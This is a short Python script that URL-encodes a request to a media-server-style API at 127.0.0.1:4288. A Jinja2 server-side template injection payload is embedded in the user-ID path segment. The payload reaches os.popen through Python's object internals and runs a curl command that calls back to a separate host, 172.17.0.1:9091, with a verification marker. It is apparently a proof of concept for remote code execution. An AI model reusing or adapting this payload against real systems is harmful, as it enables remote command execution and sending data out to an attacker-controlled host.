import urllib.parse

raw_url = "http://127.0.0.1:4288/Users/{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].popen('curl http://172.17.0.1:9091/?data=loudongyanzheng').read()}}/Items?SortBy=IsFavoriteOrLiked%2CRandom&IncludeItemTypes=Movie%2CSeries%2CMusicArtist&Limit=20&Recursive=true&ImageTypeLimit=0&EnableImages=false&ParentId=3227ce1e069754c594af25ea66d69fc7&EnableTotalRecordCount=false"

# encoded = urllib.parse.quote(raw_url, safe="/:?&=%")
encoded = urllib.parse.quote(raw_url, safe="/:?&=%")
print(encoded)
